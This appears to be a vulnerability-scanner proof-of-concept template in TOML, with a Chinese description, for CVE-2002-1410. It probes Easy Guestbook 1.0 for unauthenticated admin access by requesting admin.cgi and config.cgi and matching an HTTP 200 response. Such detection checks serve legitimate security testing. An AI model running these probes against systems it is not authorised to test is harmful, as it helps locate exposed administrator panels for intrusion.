[info]
author = "ave"
description = "验证 Easy Guestbook 1.0 是否存在未授权管理访问漏洞，通过直接访问 admin.cgi 和 config.cgi 检测管理员功能是否缺乏身份认证"
id = "POC-AVE-2002-0576"
name = "Easy Guestbook 未授权管理访问 PoC"
severity = "high"
tags = ["ave-2002-0576"]
vuln_id = [
    "CVE-2002-1410",
    "AVE-2002-0576",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/admin.cgi"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/config.cgi"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
status = [200]
type = "status"
